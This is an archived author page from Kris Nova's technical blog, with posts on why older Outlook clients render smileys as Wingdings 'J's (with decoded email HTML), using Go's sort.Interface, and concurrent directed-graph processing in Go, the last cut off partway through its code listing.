<!DOCTYPE html>
<html lang="en-US">
<head>
<script async defer src="https://buttons.github.io/buttons.js"></script>

<script>window.twttr = (function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0],
    t = window.twttr || {};
  if (d.getElementById(id)) return t;
  js = d.createElement(s);
  js.id = id;
  js.src = "https://platform.twitter.com/widgets.js";
  fjs.parentNode.insertBefore(js, fjs);

  t._e = [];
  t.ready = function(f) {
    t._e.push(f);
  };

  return t;
}(document, "script", "twitter-wjs"));</script>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://www.nivenly.com/xmlrpc.php">
<title>Kris Nova &#8211; Page 3</title>
<link rel='dns-prefetch' href='../../../../../nivenly.com/index.html' />
<link rel='dns-prefetch' href='https://fonts.googleapis.com/' />
<link rel='dns-prefetch' href='https://s.w.org/' />
<link rel="alternate" type="application/rss+xml" title=" &raquo; Feed" href="../../../../feed/index.html" />
<link rel="alternate" type="application/rss+xml" title=" &raquo; Comments Feed" href="../../../../comments/feed/index.html" />
<link rel="alternate" type="application/rss+xml" title=" &raquo; Posts by Kris Nova Feed" href="../../feed/index.html" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.nivenly.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.8.11"}};
			!function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a){case"flag":return k.fillText(f(55356,56826,55356,56819),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,56826,8203,55356,56819),0,0),c=j.toDataURL(),b!==c&&(k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447),0,0),c=j.toDataURL(),b!==c);case"emoji4":return k.fillText(f(55358,56794,8205,9794,65039),0,0),d=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55358,56794,8203,9794,65039),0,0),e=j.toDataURL(),d!==e}return!1}function e(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i,j=b.createElement("canvas"),k=j.getContext&&j.getContext("2d");for(i=Array("flag","emoji4"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='contact-form-7-css'  href='../../../../wp-content/plugins/contact-form-7/includes/css/styles.css@ver=4.8.css' type='text/css' media='all' />
<link rel='stylesheet' id='icomoon-css'  href='../../../../wp-content/plugins/kiwi-social-share/assets/vendors/icomoon/style.css@ver=2.0.4.css' type='text/css' media='all' />
<link rel='stylesheet' id='counter-style-css'  href='../../../../wp-content/plugins/page-visit-counter/public/css/counter-style.css@ver=4.8.11.css' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='../../../../wp-includes/css/dashicons.min.css@ver=4.8.11.css' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='../../../../wp-content/plugins/post-views-counter/css/frontend.css@ver=1.2.7.css' type='text/css' media='all' />
<link rel='stylesheet' id='micky-defaultbasic-css'  href='../../../../wp-content/themes/micky/style.css@ver=1.css' type='text/css' media='all' />
<link rel='stylesheet' id='bootstrap-css'  href='../../../../wp-content/themes/micky/assets/css/bootstrap.min.css@ver=1.css' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css'  href='../../../../wp-content/themes/micky/assets/css/font-awesome.css@ver=1.css' type='text/css' media='all' />
<link rel='stylesheet' id='line-icons-css'  href='../../../../wp-content/themes/micky/assets/css/simple-line-icons.css@ver=1.css' type='text/css' media='all' />
<link rel='stylesheet' id='bootstrap-select-css'  href='../../../../wp-content/themes/micky/assets/css/bootstrape-select.css@ver=1.css' type='text/css' media='all' />
<link rel='stylesheet' id='animation-css'  href='../../../../wp-content/themes/micky/assets/css/animation.css@ver=1.css' type='text/css' media='all' />
<link rel='stylesheet' id='micky-style-css'  href='../../../../wp-content/themes/micky/assets/css/custom-style.css@ver=1.css' type='text/css' media='all' />
<link rel='stylesheet' id='micky-responsive-css'  href='../../../../wp-content/themes/micky/assets/css/responsive.css@ver=1.css' type='text/css' media='all' />
<style id='micky-responsive-inline-css' type='text/css'>

		.header_top_main .mk_top_navigations ul.menu li a {
			color: ;
		}
		.header_top_main .mk_top_navigations > ul > li.current_page_item > a {
			border-color: ;
		}
		.header_top_main .mk_top_navigations > ul > li > a:hover {
			border-color: ;
		}
</style>
<link rel='stylesheet' id='micky-googlefonts-css'  href='https://fonts.googleapis.com/css?family=Montserrat%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C800%2C900&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
<script type='text/javascript' src='../../../../wp-includes/js/jquery/jquery.js@ver=1.12.4'></script>
<script type='text/javascript' src='../../../../wp-includes/js/jquery/jquery-migrate.min.js@ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var pagevisit = {"ajaxurl":"https:\/\/www.nivenly.com\/wp-admin\/admin-ajax.php","pageurl":"https:\/\/www.nivenly.com\/author\/kris\/page\/3"};
/* ]]> */
</script>
<script type='text/javascript' src='../../../../wp-content/plugins/page-visit-counter/public/js/custom.js@ver=1.0.0'></script>
<link rel='https://api.w.org/' href='../../../../wp-json/index.html' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../../../xmlrpc.php@rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="../../../../wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 4.8.11" />
<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #ffffff; }
</style>
<style type="text/css" id="syntaxhighlighteranchor"></style>
<link rel="icon" href="../../../../wp-content/uploads/2016/11/cropped-imageedit_1_3569246463-32x32.png" sizes="32x32" />
<link rel="icon" href="../../../../wp-content/uploads/2016/11/cropped-imageedit_1_3569246463-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon-precomposed" href="../../../../wp-content/uploads/2016/11/cropped-imageedit_1_3569246463-180x180.png" />
<meta name="msapplication-TileImage" content="https://www.nivenly.com/wp-content/uploads/2016/11/cropped-imageedit_1_3569246463-270x270.png" />
</head>
<body class="archive paged author author-kris author-1 custom-background paged-3 author-paged-3 hfeed">
<div class="main_wrapper_cover">
<header>
<div class="wrapper_main header_top_main">
   <div class="container">
    <div class="row">
     <div class="full_width header_navigation">
      <div class="col-sm-3">
	   <div class="mk_logo">
	   		<h1 class="site-title"><a href="../../../../../nivenly.com/index.html" rel="home"></a></h1>
	   </div>
	  </div>
      <div class="col-sm-9">   
       <!-- navbar toggle start -->
		  <div class="navbar-header pull-right">
			  <button type="button" class="navbar-toggle navbar_toogle" data-toggle="collapse" data-target="#myNavbar"> 
				<i class="fa fa-list-ul"></i> 
			  </button>
		  </div>
       <!-- navbar toggle end--> 
       <!-- navigation start -->
       <div class="mk_top_navigations">
	   <ul id="menu-header" class="menu"><li id="menu-item-169" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-169"><a href="../../../../../nivenly.com/index.html">Home</a></li>
<li id="menu-item-469" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-469"><a href="../../../../category/go/index.html">Go</a></li>
<li id="menu-item-470" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-470"><a href="../../../../category/k8s/index.html">Kubernetes</a></li>
<li id="menu-item-472" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-472"><a href="../../../../category/unix/index.html">Unix</a></li>
<li id="menu-item-407" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-407"><a href="https://becomingkris.com">BecomingKris.com</a></li>
<li id="menu-item-595" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-595"><a href="http://cnibook.info">CNI Book</a></li>
</ul>		
        </div>
       <!-- navigation end --> 
      </div>
      <!-- header_navigation_cover --> 
     </div>
    </div>
   </div>
  </div>
  <!--  header navigation end --> 
</header><div class="wrapper_main breadcum_part">
	<div class="container">
		<div class="row">
			<div class="col-lg-12">
				<div class="breadcum_inner main">
				<h3 class="">Archives</h3> 
				</div>
			</div>
		</div>
	</div>
</div>
<div class="wrapper_main Blog_details_section">
	<div class="container">
		<div class="row">
				<div class="col-lg-12 col-md-12 col-sm-12">
				<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">
						<div class="page-title">Author: <span class="vcard">Kris Nova</span></div>			<div id="post-409" class="post-409 post type-post status-publish format-standard hentry category-uncategorized category-unix">
<div class="blog_post_wrapper_main">
      <div class="blog_thumbnail"> 
	  	  </div>
</div>
<div class="blog_mk_title">
<h3><a href="../../../../index.html@p=409.html">The Secret of Microsoft Emails J</a></h3>
</div>
<div class="blog_desc blog_details_desc mar_b_30">
	<div class="bottom">
	<span class="posted-on"> <a href="../../../../index.html@p=409.html" rel="bookmark"><time class="entry-date published" datetime="2017-06-07T01:22:22+00:00">June 7, 2017</time><time class="updated" datetime="2017-07-04T01:13:54+00:00">July 4, 2017</time></a></span><span class="byline"> by <span class="author vcard"><a class="url fn n" href="../../index.html">Kris Nova</a></span></span>  
		<span class="link_icon">
		<a href="../../../../index.html@p=409.html"><i class="fa fa-chevron-right"></i></a>
		</span>
	</div>
	<div class="blog_content">
		<p><p>So a good friend of mine recently posted something on Twitter&#8230;<a href="https://twitter.com/jessfraz/status/872191760721686528" target="_blank" rel="noopener"><img class="aligncenter wp-image-415 size-large" src="http://www.nivenly.com/wp-content/uploads/2017/06/Screen-Shot-2017-06-06-at-18.42.15-1024x544.png" alt="screen-shot-2017-06-06-at-18-42-15" width="792" height="421" srcset="../../../../wp-content/uploads/2017/06/Screen-Shot-2017-06-06-at-18.42.15-1024x544.png 1024w, ../../../../wp-content/uploads/2017/06/Screen-Shot-2017-06-06-at-18.42.15-300x159.png 300w, ../../../../wp-content/uploads/2017/06/Screen-Shot-2017-06-06-at-18.42.15-768x408.png 768w, ../../../../wp-content/uploads/2017/06/Screen-Shot-2017-06-06-at-18.42.15.png 1228w" sizes="(max-width: 792px) 100vw, 792px" /></a></p>
<p>So I decided to crank out a quick write up on the matter. It&#8217;s something that also bothered me for the longest time, and a few years ago when I was hired into a job that enforced using Outlook clients I finally got to the bottom of it!</p>
<p>Also I work at Microsoft, so I had the best testing ground in the world. I just set an email to a non-outlook email address from my work account. Let&#8217;s take a look and see what happened.</p>
<h1 style="text-align: center;">From office 365<br />
<img class="size-medium wp-image-411 alignleft" src="http://www.nivenly.com/wp-content/uploads/2017/06/Screen-Shot-2017-06-06-at-18.30.50-300x155.png" alt="screen-shot-2017-06-06-at-18-30-50" width="300" height="155" srcset="../../../../wp-content/uploads/2017/06/Screen-Shot-2017-06-06-at-18.30.50-300x155.png 300w, ../../../../wp-content/uploads/2017/06/Screen-Shot-2017-06-06-at-18.30.50.png 592w" sizes="(max-width: 300px) 100vw, 300px" /></h1>
<p>So that actually worked out as expected!</p>
<p>It looks like the new Office 365 web client is on point and doing great. Â Good job everyone!</p>
<p>Heck, even the smiley face is the proper emoticon code ğŸ˜Š (<code>&amp;#x1F601;</code>)</p>
<p>For clarity I went ahead and pulled to raw message, and ran a quick <code>base64</code>Â decode on it to get the following outputs.</p>
<h4>raw</h4>
<pre class="brush: xml; title: ; notranslate" title="">
&lt;html&gt;

&lt;head&gt;
    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
    &lt;style type=&quot;text/css&quot; style=&quot;display:none;&quot;&gt;
        &lt;!-- P {
            margin-top: 0;
            margin-bottom: 0;
        }
        
        --&gt;
    &lt;/style&gt;
&lt;/head&gt;

&lt;body dir=&quot;ltr&quot;&gt;
    &lt;div id=&quot;divtagdefaultwrapper&quot; style=&quot;font-size:12pt;color:#000000;font-family:Calibri,Helvetica,sans-serif;&quot; dir=&quot;ltr&quot;&gt;
        &lt;p&gt;Hi everyone!&lt;/p&gt;
        &lt;p&gt;
            &lt;br&gt;
        &lt;/p&gt;
        &lt;p&gt;Just sending a quick testing email &lt;span&gt;ğŸ˜Š&lt;/span&gt;&lt;/p&gt;
        &lt;p&gt;&lt;span&gt;&lt;br&gt;
&lt;/span&gt;&lt;/p&gt;
        &lt;p&gt;
            &lt;br&gt;
        &lt;/p&gt;
    &lt;/div&gt;
&lt;/body&gt;

&lt;/html&gt;
</pre>
<p>But I know there are sinister email&#8217;s still lurking around the internet somewhere. Let&#8217;s dive deeper..</p>
<h1 style="text-align: center;">From Outlook</h1>
<p><img class="size-medium wp-image-422 alignleft" src="http://www.nivenly.com/wp-content/uploads/2017/06/ScreenShot2017-06-06at18.56.35-300x124.jpg" alt="screenshot2017-06-06at18-56-35" width="300" height="124" srcset="../../../../wp-content/uploads/2017/06/ScreenShot2017-06-06at18.56.35-300x124.jpg 300w, ../../../../wp-content/uploads/2017/06/ScreenShot2017-06-06at18.56.35.jpg 562w" sizes="(max-width: 300px) 100vw, 300px" />I found an email in my archives when I tested this theory years ago. My only computer that runs the Outlook client is actually at the office, and I am lazy.</p>
<p>Regardless, this sample is really what we are looking for!</p>
<p>Here we can see that the <code>HTML</code>Â in the email does something fairly concerning. We didn&#8217;t get valid <code>HTML</code>. The email used a pseudo <code>HTML</code> markdown that was designed for word-processing style sheets, and does not adhere to the <code>ISO/IEC 15445</code> standard for <code>HTML!</code></p>
<p>The markdown actually references some font logic that is defined as an <code>HTML</code> comment, as well as referencing a proprietary font!</p>
<p>Hence why the font definitions aren&#8217;t being interpreted, and the user is left with an unfriendly looking email to read. Below is the decoded <code>base64</code> content.</p>
<h4>raw</h4>
<pre class="brush: xml; title: ; notranslate" title="">
&lt;html xmlns:o=&quot;urn:schemas-microsoft-com:office:office&quot; xmlns:w=&quot;urn:schemas-microsoft-com:office:word&quot; xmlns:m=&quot;http://schemas.microsoft.com/office/2004/12/omml&quot; xmlns=&quot;http://www.w3.org/TR/REC-html40&quot;&gt;

&lt;head&gt;
    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
    &lt;meta name=&quot;Title&quot; content=&quot;&quot;&gt;
    &lt;meta name=&quot;Keywords&quot; content=&quot;&quot;&gt;
    &lt;meta name=&quot;Generator&quot; content=&quot;Microsoft Word 15 (filtered medium)&quot;&gt;
    &lt;style&gt;
        &lt;!--
        /* Font Definitions */
        
        @font-face {
            font-family: Wingdings;
            panose-1: 5 0 0 0 0 0 0 0 0 0;
        }
        
        @font-face {
            font-family: &quot;Cambria Math&quot;;
            panose-1: 2 4 5 3 5 4 6 3 2 4;
        }
        
        @font-face {
            font-family: Calibri;
            panose-1: 2 15 5 2 2 2 4 3 2 4;
        }
        /* Style Definitions */
        
        p.MsoNormal,
        li.MsoNormal,
        div.MsoNormal {
            margin: 0in;
            margin-bottom: .0001pt;
            font-size: 12.0pt;
            font-family: Calibri;
        }
        
        a:link,
        span.MsoHyperlink {
            mso-style-priority: 99;
            color: #0563C1;
            text-decoration: underline;
        }
        
        a:visited,
        span.MsoHyperlinkFollowed {
            mso-style-priority: 99;
            color: #954F72;
            text-decoration: underline;
        }
        
        span.EmailStyle17 {
            mso-style-type: personal-compose;
            font-family: Calibri;
            color: windowtext;
        }
        
        span.msoIns {
            mso-style-type: export-only;
            mso-style-name: &quot;&quot;;
            text-decoration: underline;
            color: teal;
        }
        
        .MsoChpDefault {
            mso-style-type: export-only;
            font-family: Calibri;
        }
        
        @page WordSection1 {
            size: 8.5in 11.0in;
            margin: 1.0in 1.0in 1.0in 1.0in;
        }
        
        div.WordSection1 {
            page: WordSection1;
        }
        
        --&gt;
    &lt;/style&gt;
&lt;/head&gt;

&lt;body bgcolor=&quot;white&quot; lang=&quot;EN-US&quot; link=&quot;#0563C1&quot; vlink=&quot;#954F72&quot;&gt;
    &lt;div class=&quot;WordSection1&quot;&gt;
        &lt;p class=&quot;MsoNormal&quot;&gt;&lt;span style=&quot;font-size:11.0pt&quot;&gt;Hey this is a test! &lt;/span&gt;&lt;span style=&quot;font-size:11.0pt;font-family:Wingdings&quot;&gt;J&lt;/span&gt;&lt;span style=&quot;font-size:11.0pt&quot;&gt;
&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;&lt;/p&gt;
        &lt;p class=&quot;MsoNormal&quot;&gt;&lt;span style=&quot;font-size:11.0pt&quot;&gt;&lt;o:p&gt;&amp;nbsp;&lt;/o:p&gt;&lt;/span&gt;&lt;/p&gt;
    &lt;/div&gt;
&lt;/body&gt;

&lt;/html&gt;
</pre>
<h3 style="text-align: center;">The infamous capitalÂ j</h3>
<p>If you have ever wondered why you see erroneous <code>j</code>&#8216;s floating around in emails, the unencoded sample from above can answer that as well.</p>
<p>When a user (in the older Outlook tools) types <code>:)</code> the program will actually replace the smiley face with <code><span style="font-size: 11.0pt; font-family: Wingdings;">J</span></code> instead of ğŸ˜Š.</p>
<p>The source clearly shows that the smiley face being sent is encoded in the Wingdings font!</p>
<pre class="brush: xml; title: ; notranslate" title="">
&lt;span style=&quot;font-size:11.0pt;font-family:Wingdings&quot;&gt;J&lt;/span&gt;
</pre>
<p>Wingdings is available for purchase here at <a href="https://www.microsoft.com/typography/fonts/">microsoft.com/typography/fonts</a> if you want to run it on your server to decode the <code>J</code>&#8216;s properly.</p>
<h1 style="text-align: center;">tldr;</h1>
<p style="text-align: center;">Older outlook clients used to do some wonky things with mime encoding andÂ pseudo HTML formatting that conflicted with <code>ISO/IEC 15445</code></p>
<p style="text-align: center;">Most clients probably don&#8217;t support the non-standard encoding (well). Â So it&#8217;s another case of not adhering to standard to do things a proprietary way.</p>
<p style="text-align: center;">So in theory, Outlook has been using emoticons since before emoticons were cool. NO BIG DEAL!</p>
<p style="text-align: center;">Glad to know it&#8217;s working as expected now, and that we should see the problem disappear over time. So much â¤ for the engineers who helped fix this! jjj</p>
				</p>
	</div>
</div>
</div><!-- #post-## --><div id="post-343" class="post-343 post type-post status-publish format-standard hentry category-go">
<div class="blog_post_wrapper_main">
      <div class="blog_thumbnail"> 
	  	  </div>
</div>
<div class="blog_mk_title">
<h3><a href="../../../../index.html@p=343.html">Using sort.Sort() in Go</a></h3>
</div>
<div class="blog_desc blog_details_desc mar_b_30">
	<div class="bottom">
	<span class="posted-on"> <a href="../../../../index.html@p=343.html" rel="bookmark"><time class="entry-date published" datetime="2017-04-10T05:19:51+00:00">April 10, 2017</time><time class="updated" datetime="2017-04-13T22:16:26+00:00">April 13, 2017</time></a></span><span class="byline"> by <span class="author vcard"><a class="url fn n" href="../../index.html">Kris Nova</a></span></span>  
		<span class="link_icon">
		<a href="../../../../index.html@p=343.html"><i class="fa fa-chevron-right"></i></a>
		</span>
	</div>
	<div class="blog_content">
		<p><p>A well written sorting algorithm is hard to replace, and typically the ones that have been battle tested will stand the test of time and stick around for a while. The Go programming language offers a cleanÂ abstraction on top of a commonly used sorting algorithm. With the <code>sort</code>Â  package in the standard library a user can sort arbitrary types in arbitrary ways using a time-proven sorting algorithm.</p>
<p>The way Go has set this up for us is by defining an interface called the <code>sort.Interface</code>. The rule is that as long as a type implementsÂ to this interface, it can be sorted.</p>
<p>&nbsp;</p>
<h3 style="text-align: center;">The <code>sort.Interface</code> interface</h3>
<pre class="brush: golang; title: ; notranslate" title="">

type Interface interface {
       // Len is the number of elements in the collection.
       Len() int
       // Less reports whether the element with
       // index i should sort before the element with index j.
       Less(i, j int) bool
       // Swap swaps the elements with indexes i and j.
       Swap(i, j int)
}
</pre>
<p>The interface definition can be found <a href="https://golang.org/src/sort/sort.go?s=523:801#L6">here</a>.Â The interface defines 3 functions, all of which are critical to the success of the sort.</p>
<h6>Len()</h6>
<p>The sort works by dividing the length of a collection by 2. So we need a way to determineÂ a length (or size) of a collection. Think of this like the <code>len()</code>Â function in Go, and usually the <code>len()</code>Â function is appropriate to use here.</p>
<h6>Less()</h6>
<p>This is a function that will receive 2 integer indicesÂ from the collection. The algorithm assumes the implementation will perform <strong>some</strong> logic here and make an assertion. The algorithm will not care if a user actually checks if a value is <strong>less</strong> than another, as that assertion is completely arbitrary. This is analogous to the function used to compare values in C&#8217;s <code>qsort()</code></p>
<h6>Swap()</h6>
<p>Go takes the sort abstraction one step further, and also makes the user define a <code>Swap()</code>Â function. This is called after <code>Less()</code>Â returns <code>false</code>Â and the algorithm understands that a change is needed. In Go however, you can make <code>Swap()</code>Â do whatever you want in this case.</p>
<h2 style="text-align: center;">Sorting integersÂ with <code>sort.Sort()</code></h2>
<p>A very basic example of defining a <code>sort.Interface</code>Â implementation is to create an integer alias in Go, and implement the required functions.</p>
<pre class="brush: golang; title: ; notranslate" title="">
type Integers []int

func (s Integers) Len() int {
	return len(s)
}
func (s Integers) Swap(i, j int) {
	s[i], s[j] = s[j], s[i]
}
func (s Integers) Less(i, j int) bool {
	return s[i] &lt; s[j]
}
</pre>
<p>This implementation can now be passed to <code>sort.Sort()</code>Â and sorted on. A full working example of an integer sort with <code>sort.Sort()</code> can be found <a href="https://play.golang.org/p/uK1oECMLGP" target="_blank">here in the Go playground</a>, or my rawÂ source <a href="https://github.com/Nivenly/nivenly.com/blob/master/examples/go/sort/integers.go" target="_blank">here on GitHub</a>.</p>
<h2 style="text-align: center;">Sorting structs withÂ <code>sort.Sort()</code></h2>
<p>Below is an example of sorting on a collection of custom types, and using the <code>utf8</code> package to sort on the <code>int32</code> value of a <code>rune</code>. This is important because it demonstrates how a user might want to sort on a &#8220;calculated&#8221; value instead of a literal value.</p>
<p>A user can implement any logic they wish in <code>Less()</code>Â or in <code>Swap()</code>Â giving the user a powerful opportunity to build quick and efficient sorting programÂ on any type they can dream of. This is useful in situations where the logic for what a user wants to sort on, might be something different than a simple numerical or alphabetical sort.</p>
<pre class="brush: golang; title: ; notranslate" title="">
type Type struct {
	Value string
}

type Types []Type

func (s Types) Len() int {
	return len(s)
}
func (s Types) Swap(i, j int) {
	s[i], s[j] = s[j], s[i]
}
func (s Types) Less(i, j int) bool {
	iRune, _ := utf8.DecodeRuneInString(s[i].Value)
	jRune, _ := utf8.DecodeRuneInString(s[j].Value)
	return int32(iRune) &gt; int32(jRune)
}
</pre>
<p>As always you can<a href="https://play.golang.org/p/iRTRdx_OnL"> run the code in Go Playground</a>, and also see <a href="https://github.com/Nivenly/nivenly.com/blob/master/examples/go/sort/customtype.go">the raw source in GitHub</a>.</p>
<h2 style="text-align: center;">Conclusion</h2>
<p>The Go programming language offers a familiar and clean abstraction for sorting on arbitrary types and with arbitrary logic. The user can implement any logic they wishÂ in regards to what the sort will use to sort on.</p>
<p>By offering the underlying algorithm and defining the <code>sort.Interface</code>Â the programming language helps us build powerful sorting programs without enforcing a single opinion onÂ <strong>what</strong> the algorithm should do but ratherÂ <strong>how</strong> to do it.</p>
<h4 style="text-align: center;">Thanks!</h4>
<p>Thank you for reading my article. As always, I appreciate any feedback from users. So let me know how we could be better.</p>
<p><a class="github-button" href="https://github.com/kris-nova" data-style="mega" data-count-href="/kris-nova/followers" data-count-api="/users/kris-nova#followers" data-count-aria-label="# followers on GitHub">Follow @kris-nova</a></p>
				</p>
	</div>
</div>
</div><!-- #post-## --><div id="post-235" class="post-235 post type-post status-publish format-standard hentry category-go">
<div class="blog_post_wrapper_main">
      <div class="blog_thumbnail"> 
	  	  </div>
</div>
<div class="blog_mk_title">
<h3><a href="../../../../index.html@p=235.html">Concurrent Digraph Processing in Go</a></h3>
</div>
<div class="blog_desc blog_details_desc mar_b_30">
	<div class="bottom">
	<span class="posted-on"> <a href="../../../../index.html@p=235.html" rel="bookmark"><time class="entry-date published" datetime="2017-03-20T01:59:55+00:00">March 20, 2017</time><time class="updated" datetime="2017-03-20T02:22:05+00:00">March 20, 2017</time></a></span><span class="byline"> by <span class="author vcard"><a class="url fn n" href="../../index.html">Kris Nova</a></span></span>  
		<span class="link_icon">
		<a href="../../../../index.html@p=235.html"><i class="fa fa-chevron-right"></i></a>
		</span>
	</div>
	<div class="blog_content">
		<p><p>So today I decided to take on a fairly complex design pattern in the hopes of demonstrating some more advanced features of concurrency in Go or at least ruffle a few feathers about how to approach digraph processing.</p>
<p>Wikipedia offers a great explanation of <a href="https://en.wikipedia.org/wiki/Graph_theory" target="_blank">graph theory</a> in case you need to brush up!</p>
<p>The goal of this post is to offer a design approach to processing graphs concurrently , where each vertex in the graph represents a processable unit of work .</p>
<p>The graph will be processed concurrently via a `Crawl()` operation, where there are N number of concurrent processors . Each processor will process a stream of vertices procedurally by referencing a function pointer to a `process()` function.</p>
<h2>The Graph</h2>
<p>The graph is composed of edges and vertices. We start the example off by building a complex graph with an arbitrary child count. Each of the children may or may not have their own children. A child is represented by a vertex.</p>
<h2>The Vertices</h2>
<p>A vertex represent the intersections of the graph. Where 2 edges intersect, there will be a vertex. The only way to get from one vertex to another is to traverse it&#8217;s corresponding edge.</p>
<h2>The Edges</h2>
<p>Edges are what connect vertices. Every edge has a `to` and a `from` pointer that will point to the two vertices it&#8217;s connecting. Because the edge insinuates direction, and only connects in a single direction that makes the graph a directional graph, or a digraph. </p>
<h2>The Processors</h2>
<p>Processors process vertexes. In this example we simulate some arbitrary work by injecting a random sleep. In a real implementation a processor would actually accomplish some amount of work that a vertex would require. We have N processors so they can operate on vertices concurrently. The more processors, the more vertices we can concurrently operate on, or process.</p>
<h2>The Crawler</h2>
<p>The crawler will traverse edges to find vertices. As the crawler finds a vertex it will concurrently process each vertex by passing it to a processor. Processors are called cyclically and in order. </p>
<p>For example if we had 10 vertices and 3 processors the call pattern would look like this.</p>
<pre class="brush: plain; title: ; notranslate" title="">
V -- P
------
1 -- 1
2 -- 2
3 -- 3
4 -- 1
5 -- 2
6 -- 3
7 -- 1
8 -- 2
9 -- 3
0 -- 1
</pre>
<p>The vertices to be processed in <strong>unique</strong> goroutines, but on <strong>shared</strong> channels. The channels will buffer and form a queue if the vertex workflow overflows their ability to keep up. </p>
<h2> The win </h2>
<p>The huge win here is that the graph stays constructed in it&#8217;s original form. The crawler can iterate through it&#8217;s many (and complex) layers quickly because of the concurrent processing design. A processor could be replaced with any implementation capable of running a workload. This allows the user to structure complex data, while operating on it without any overhead of understanding the data. The processor gets a vertex, and thats it. The processors have no concept of order, and they don&#8217;t need to.</p>
<p>Notice how the program is able to calculate the operations by counting the graph, and the graph is actually processed quickly with the same number of operations. Good. Clean. Concurrent processing.</p>
<p>Furthermore a user can turn up the number of iterations and specify how many times to visit each vertex. This is useful in situations were a process is idempotent but could potentially fail. Sending the same request N number of times makes sense and increases the probability of a success.</p>
<pre class="brush: golang; title: ; notranslate" title="">
package main



import (
	&quot;math/rand&quot;
	&quot;time&quot;
	&quot;fmt&quot;
)

const (
	NumberOfConcurrentProcessors = 32
	NumberOfCrawlIterations = 4
)

// DiGraph
//
// This is a directional graph where edges can point in any direction between vertices.
// The graph has 1 root vertex, which is where the Crawl() starts from.
type DiGraph struct {
	RootVertex       *Vertex       // The root vertex of the graph
	Processors       [] *Processor // List of concurrent processors
	ProcessorIndex   int           // The current index of the next processor to use
	Edges            []*Edge       // All directional edges that make up the graph
	Iterations       int           // The total number of times to iterate over the graph
	TotalVertices    int           // Count of the total number of vertices that make up the graph
	ProcessedChannel chan int      // Channel to track processed vertices
	ProcessedCount   int           // Total number of processed vertices
	TotalOperations  int           // Total number of expected operations | [(TotalVertices * Iterations) - Iterations] + 1
}

// Vertex
//
// A single unit that composes the graph. Each vertex has relationships with other vertices,
// and should represent a single entity or unit of work.
type Vertex struct {
	Name   string // Unique name of this Vertex
	Edges  []*Edge
	Status int
}

// Edge
//
// Edges connect vertices together. Edges have a concept of how many times they have been processed
// And a To and From direction
type Edge struct {
	To             *Vertex
	From           *Vertex
	ProcessedCount int
}

// Processor
//
// This represents a single concurrent process that will operate on N number of vertices
type Processor struct {
	Function func(*Vertex) int
	Channel  chan *Vertex
}

// Init the graph with a literal definition
var TheGraph *DiGraph = NewGraph()

func main() {
	TheGraph.Init(NumberOfConcurrentProcessors, NumberOfCrawlIterations)
	TheGraph.Crawl()
}

func (d *DiGraph) Init(n, i int) {
	noProcs := n
	d.TotalVertices = d.RootVertex.recursiveCount()
	d.Iterations = i
	for ; n &gt; 0; n-- {
		p := Processor{Channel: make(chan *Vertex)}
